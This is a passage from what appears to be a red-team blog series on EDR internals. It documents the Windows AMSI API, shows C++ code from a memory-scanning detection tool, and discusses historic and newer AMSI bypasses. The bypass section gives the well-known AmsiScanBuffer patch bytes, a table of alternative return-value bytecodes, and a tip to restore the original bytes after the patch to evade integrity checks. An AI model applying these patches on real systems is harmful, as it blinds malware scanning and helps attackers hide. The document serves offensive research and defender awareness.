+<table><thead><tr><th>Function</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiclosesession"><strong>AmsiCloseSession</strong></a></td><td>Close a session that was opened by <a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession">AmsiOpenSession</a>.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize"><strong>AmsiInitialize</strong></a></td><td>Initialize the AMSI API.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsinotifyoperation"><strong>AmsiNotifyOperation</strong></a></td><td>Sends to the antimalware provider a notification of an arbitrary operation.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiopensession"><strong>AmsiOpenSession</strong></a></td><td>Opens a session within which multiple scan requests can be correlated.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiresultismalware"><strong>AmsiResultIsMalware</strong></a></td><td>Determines if the result of a scan indicates that the content should be blocked.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanbuffer"><strong>AmsiScanBuffer</strong></a></td><td>Scans a buffer-full of content for malware.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiscanstring"><strong>AmsiScanString</strong></a></td><td>Scans a string for malware.</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiuninitialize"><strong>AmsiUninitialize</strong></a></td><td>Remove the instance of the AMSI API that was originally opened by <a href="https://docs.microsoft.com/en-us/windows/desktop/api/amsi/nf-amsi-amsiinitialize">AmsiInitialize</a>.</td></tr></tbody></table>
+<p>The benefit to this is that the detection logic is from Microsoft. Meaning a database of malware isn't required, and the provider can hook right into Microsoft's information.</p>
+<h4>AMSI Detection Example</h4>
+<p>Our sample tool Hunter has been updated to support AMSI and will be released at the end of this blog series.</p>
+<p>AMSI is supported within the following namespace:</p>
+<pre><code class="language-cpp">
+#<span class="pl-k">ifndef</span> AMSISCANNER_H
+#<span class="pl-k">define</span> <span class="pl-en">AMSISCANNER_H</span>
+#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>pch.h<span class="pl-pds">"</span></span>
+
+<span class="pl-k">namespace</span> <span class="pl-en">AmsiManager</span>
+{
+    <span class="pl-k">class</span> <span class="pl-en">Amsi</span>
+    {
+    <span class="pl-k">public:</span>
+        <span class="pl-en">Amsi</span>()
+        {
+            HRESULT hr = <span class="pl-c1">CoInitializeEx</span>(<span class="pl-c1">0</span>, COINIT_MULTITHREADED);
+            <span class="pl-k">if</span> (hr != S_OK) {
+                <span class="pl-k">throw</span> <span class="pl-smi">std::runtime_error</span>(<span class="pl-s"><span class="pl-pds">"</span>COM library failed to initialize<span class="pl-pds">"</span></span>);
+            }
+        }
+        <span class="pl-en">~Amsi</span>()
+        {
+            <span class="pl-c1">CoUninitialize</span>();
+        }
+
+        <span class="pl-k">void</span> <span class="pl-en">ScanWithAmsi</span>()
+        {
+            AmsiManager::Amsi amsi = <span class="pl-c1">AmsiManager::Amsi</span>();
+            amsi.<span class="pl-c1">ScanMemory</span>(_regions, _hProcess);
+        }
+    };
+}
+#<span class="pl-k">endif</span>
+
+</code></pre>
+<p>Following documentation, AMSI is initialised and a session created:</p>
+<pre><code class="language-cpp">
+<span class="pl-en">ZeroMemory</span>(&amp;hAmsi, <span class="pl-k">sizeof</span>(hAmsi));
+hr = AmsiInitialize(<span class="pl-s"><span class="pl-pds">L"</span>Hunter<span class="pl-pds">"</span></span>, &amp;hAmsi);
+<span class="pl-k">if</span> (hr != S_OK) {
+    <span class="pl-c1">Errors::Show</span>().<span class="pl-c1">print_hresult</span>(<span class="pl-s"><span class="pl-pds">"</span>AmsiInitialize<span class="pl-pds">"</span></span>, hr);
+    <span class="pl-k">return</span>;
+}
+
+hr = AmsiOpenSession(hAmsi, &amp;hSession);
+<span class="pl-k">if</span> (hr != S_OK) {
+    <span class="pl-c1">Errors::Show</span>().<span class="pl-c1">print_hresult</span>(<span class="pl-s"><span class="pl-pds">"</span>AmsiOpenSession<span class="pl-pds">"</span></span>, hr);
+    <span class="pl-k">return</span>;
+}
+
+</code></pre>
+<p>Once it has been setup, the memory regions are looped over and passed into <code>AmsiScanBuffer</code>:</p>
+<pre><code class="language-cpp">
+<span class="pl-k">for</span> (MEMORY_BASIC_INFORMATION&amp; mbi : regions)
+{
+    <span class="pl-k">if</span> (mbi.<span class="pl-smi">BaseAddress</span> == <span class="pl-c1">nullptr</span>)
+    {
+        <span class="pl-k">continue</span>;
+    }
+    <span class="pl-k">if</span> (mbi.<span class="pl-smi">Protect</span> == PAGE_EXECUTE_READWRITE || mbi.<span class="pl-smi">Protect</span> == PAGE_EXECUTE || mbi.<span class="pl-smi">Protect</span> == PAGE_READWRITE)
+    {
+        std::vector buffer = <span class="pl-c1">ReadMemoryRegion</span>(mbi, hProcess);
+        <span class="pl-k">if</span> (buffer.<span class="pl-c1">empty</span>())
+        {
+            <span class="pl-k">continue</span>;
+        }
+        hr = <span class="pl-c1">AmsiScanBuffer</span>(hAmsi, buffer.<span class="pl-c1">data</span>(), buffer.<span class="pl-c1">size</span>(), <span class="pl-c1">NULL</span>, hSession, &amp;res);
+        <span class="pl-k">if</span> (hr != S_OK) {
+            <span class="pl-c1">Errors::Show</span>().<span class="pl-c1">print_hresult</span>(<span class="pl-s"><span class="pl-pds">"</span>AmsiScanBuffer<span class="pl-pds">"</span></span>, hr);
+            <span class="pl-k">return</span>;
+        }
+        <span class="pl-k">if</span> (res != AMSI_RESULT_CLEAN &amp;&amp; res != AMSI_RESULT_NOT_DETECTED)
+        {
+            <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>  | AMSI Detection @ 0x%p: %s<span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, mbi.<span class="pl-smi">BaseAddress</span>, <span class="pl-c1">GetResultDescription</span>(res));
+        }
+    }
+}
+
+</code></pre>
+<p>However, this seemed to work intermittently; sometimes it would trigger, others it wouldn't. Lets move onto how AMSI is typically used.</p>
+<h4>AMSI Auto-Loading</h4>
+<p>In <a href="https://docs.microsoft.com/en-us/dotnet/framework/whats-new/">What's new in .NET Framework</a> it states:</p>
+<blockquote>
+<p><strong>Antimalware scanning for all assemblies</strong>. In previous versions of .NET Framework, the runtime scans all assemblies loaded from disk using either Windows Defender or third-party antimalware software. However, assemblies loaded from other sources, such as by the <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load#system-reflection-assembly-load(system-byte()">Assembly.Load()</a>) method, are not scanned and can potentially contain undetected malware. Starting with .NET Framework 4.8 running on Windows 10, the runtime triggers a scan by antimalware solutions that implement the <a href="https://docs.microsoft.com/en-us/windows/desktop/AMSI/antimalware-scan-interface-portal">Antimalware Scan Interface (AMSI)</a>.</p>
+</blockquote>
+<p>This means that from .NET 4.8 onwards, AMSI was made apart of the framework. So, when an assembly is loaded, AMSI.DLL is too. This backdates .NET to 4.0 to provide support for AMSI.</p>
+<p>If 4.8 is installed, then check the loaded modules. Here is a case for PowerShell:</p>
+<p><img src="https://pre.empt.blog/static/images/maelstrom-6-18.PNG" alt=""></p>
+<p>The same thing will happen with a .NET assembly. This will be a significant consideration if the C2 in question is .NET and is relying on Assembly.Load to perform staging or post exploitation. With that said, there are alternatives to Assembly.Load that carry less risk by muting certain events. That will not be covered here, but see <a href="https://github.com/G0ldenGunSec/SharpTransactedLoad">SharpTransactedLoad</a>.</p>
+<h4>Historic AMSI Bypasses</h4>
+<p>Over the years, AMSI has had its problems with bypasses. Because of that, applications like <a href="https://amsi.fail/">amsi.fail</a>. Whether the C2 is in .NET, or the implant is able to host a CLR; then AMSI will need to be taken care of. As maelstrom is in neither of these sections, we can skim over some stuff here.</p>
+<p>Most commonly, people currently tend to patch AMSI by overwriting the memory <code>AmsiScanBuffer</code>.</p>
+<pre><code class="language-csharp">
+<span class="pl-smi">var</span> <span class="pl-smi">patch</span> <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-k">byte</span>[] { <span class="pl-c1">0xB8</span>, <span class="pl-c1">0x57</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x07</span>, <span class="pl-c1">0x80</span>, <span class="pl-c1">0xC3</span> };
+
+</code></pre>
+<p>This is documented in <a href="https://rastamouse.me/memory-patching-amsi-bypass/">Memory Patching AMSI Bypass</a>. In this example, the <code>HRESULT</code> is updated on the return:</p>
+<pre><code class="language-nasm">
+mov eax, 0x80070057
+ret
+
+</code></pre>
+<p>In this example, <code>0x80070057</code> is <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8">HRESULT</a>: <code>E_INVALIDARG</code>. So theoretically, this return can be any of those four:</p>
+<table><thead><tr><th>Error</th><th>Value</th><th>Bytecode</th></tr></thead><tbody><tr><td><code>E_ACCESSDENIED</code></td><td><code>0x80070005</code></td><td><code>"\xB8\x05\x00\x07\x80\xC3"</code></td></tr><tr><td><code>E_HANDLE</code></td><td><code>0x80070006</code></td><td><code>"\xB8\x06\x00\x07\x80\xC3"</code></td></tr><tr><td><code>E_INVALIDARG</code></td><td><code>0x80070057</code></td><td><code>"\xB8\x57\x00\x07\x80\xC3"</code></td></tr><tr><td><code>E_OUTOFMEMORY</code></td><td><code>0x8007000E</code></td><td><code>"\xB8\x0E\x00\x07\x80\xC3"</code></td></tr></tbody></table>
+<p>However, there is a risk here. If the EDR in question is performing integrity checks on the memory region, then it will notice when it has been changed. In terms of code, its a simple calculation to make.</p>
+<p>Assume the patch:</p>
+<pre><code class="language-csharp">
+<span class="pl-smi">var</span> <span class="pl-smi">patch</span> <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-k">byte</span>[] { <span class="pl-c1">0xB8</span>, <span class="pl-c1">0x57</span>, <span class="pl-c1">0x00</span>, <span class="pl-c1">0x07</span>, <span class="pl-c1">0x80</span>, <span class="pl-c1">0xC3</span> };
+
+</code></pre>
+<p>This is 6 bytes long, so read the first 6 or so and store them. Check at some event (time, action, etc) whether the bytes match. Additionally, this could also be done with Kernel Callbacks, ETWTi for memory alterations within AMSI.DLL, and so on. So, the amount of possible detections for altering memory is fairly high. If patching memory is required, it is recommended to read the existing bytes, apply the patch, do something malicious, then reapply the original bytes to handle the integrity checks.</p>
+<h4>Future AMSI Bypasses</h4>
+<p>Something we have had a lot of success with is making use of <a href="https://ling.re/hardware-breakpoints/">Hardware Breakpoints</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/debug/vectored-exception-handling">Vectored Exception Handlers</a>. This process was documented very well by <a href="https://twitter.com/_EthicalChaos_">Ethical Chaos</a> in <a href="https://ethicalchaos.dev/2022/04/17/in-process-patchless-amsi-bypass/">In-Process Patchless AMSI Bypass</a>. Do remember, though, this is also detectable. A Proof-of-concept for this can be seen in this <a href="https://gist.github.com/olliencc/90f6e040dfef1dccb61f5b3fdc62fa00">gist</a> where processes are scanned for breakpoints being set.</p>
+<p>We are not going to demonstrate the use of this here, and is left as a task for the reader.</p>
+<h3>Conclusion</h3>
+<p>This was a fairly long post given it's on just two native protections. We've tried to provide some clarity into the mechanisms EDRs can use to not only identify malicious activity, but prevent it. Along the way we've discussed common pitfalls and some enhancements that can be made to protect against the bypasses.</p>
+<p>Whilst doing this, we've tried to shed more light onto the 'X bypasses EDR' narrative in which, yes, the implant might have comeback but there is likely logs of the activity. As with last week's blog, it is hard to stay completely off the radar of defensive mechanisms, and it's harder still to negate these protections without having the act of negating these protections getting logged. Ultimately, everything an operator can do, broadly speaking, <em>can</em> be logged. It's up to the defender to ensure that these events are captured and linked in to their EDR, their SOC, and their awareness.</p>
+<p>Next week we will go back to our implant with a look at improving its static opsec.</p></div></div></main></div></div>
+  
+
+</body></html>
